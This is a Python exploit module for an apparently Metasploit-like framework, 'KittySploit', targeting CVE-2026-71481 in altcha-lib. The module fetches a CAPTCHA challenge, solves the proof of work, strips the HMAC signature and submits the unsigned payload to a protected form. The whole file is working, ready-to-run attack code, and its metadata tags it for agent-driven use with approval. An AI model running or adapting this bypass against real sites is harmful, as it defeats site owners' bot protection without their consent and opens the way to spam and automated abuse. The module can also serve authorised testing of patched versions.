#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-71481 — altcha verifier accepts missing HMAC signature."""

from __future__ import annotations

import time

from kittysploit import *
from lib.protocols.http.altcha import Altcha
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client, Altcha):
    __info__ = {
        "name": "altcha CVE-2026-71481 CAPTCHA signature bypass",
        "description": (
            "Fetches an altcha challenge, solves PoW, and submits a solution "
            "without the signature field (altcha-lib <= 0.5.x, fixed 0.6.0)."
        ),
        "author": ["LLCForge", "KittySploit Team"],
        "cve": ["CVE-2026-71481"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-71481",
        ],
        "tags": ["altcha", "captcha", "auth-bypass", "cve-2026-71481", "auxiliary"],
        "agent": {
            "risk": "active",
            "effects": ["auth_bypass", "network_probe"],
            "approval_required": True,
            "produces": ["captcha_bypass"],
            "chain": {
                "suggested_followups": [
                    "scanner/http/altcha_cve_2026_71481_detect",
                ],
            },
        },
    }

    challenge_path = OptString(
        "/altcha",
        "Challenge issuance path",
        required=True,
    )
    form_path = OptString(
        "/",
        "Form POST path protected by altcha",
        required=False,
    )
    form_field = OptString("altcha", "Form field for altcha payload", required=False)
    extra_fields = OptString(
        "",
        "URL-encoded extra POST fields (name=value&...)",
        required=False,
        advanced=True,
    )
    generate_only = OptBool(
        False,
        "Solve PoW and print payload only (no form POST)",
        required=False,
    )
    check_only = OptBool(
        False,
        "Fetch/decode challenge only",
        required=False,
    )
    max_iter = OptInteger(1_000_000, "Max PoW iterations", required=False, advanced=True)
    http_timeout = OptInteger(30, "HTTP timeout seconds", required=False, advanced=True)

    _PATCHED_LIB = "0.6.0"

    def run(self):
        challenge_path = str(self.challenge_path or "").strip()
        if not challenge_path:
            print_error("Set CHALLENGE_PATH")
            return False

        b64, data = self.altcha_fetch_challenge(challenge_path)
        if not data:
            print_error("Could not fetch or decode altcha challenge")
            return False

        print_success(
            f"Challenge OK: algorithm={data.get('algorithm')} salt={str(data.get('salt', ''))[:12]}..."
        )

        if bool(self.check_only):
            self.set_info(severity="medium", cve="CVE-2026-71481", challenge=True)
            return True

        start = time.monotonic()
        number = self.solve_pow(data, int(self.max_iter or 1_000_000))
        if number is None:
            print_error(f"PoW not solved within {int(self.max_iter or 1_000_000)} iterations")
            return False
        elapsed = time.monotonic() - start
        print_status(f"PoW solved: n={number} in {elapsed:.2f}s")

        payload = self.encode_solution(data, number, include_signature=False)
        print_success(f"Unsigned payload: {payload[:72]}...")

        if bool(self.generate_only):
            print_info(payload)
            self.set_info(severity="high", cve="CVE-2026-71481", payload=payload[:120])
            return True

        form_path = str(self.form_path or "").strip()
        if not form_path:
            print_error("Set FORM_PATH or use GENERATE_ONLY")
            return False

        extras = self.parse_extra_fields(str(self.extra_fields or ""))
        ok, code, body = self.altcha_submit(
            form_path,
            str(self.form_field or "altcha"),
            payload,
            extras,
        )
        if ok:
            print_success(f"CAPTCHA bypass accepted (HTTP {code})")
            if body.strip():
                print_status(body[:800])
            self.set_info(severity="high", cve="CVE-2026-71481", http_status=code)
            return True

        print_error(f"Bypass rejected (HTTP {code})")
        if body.strip():
            print_status(body[:400])
        return False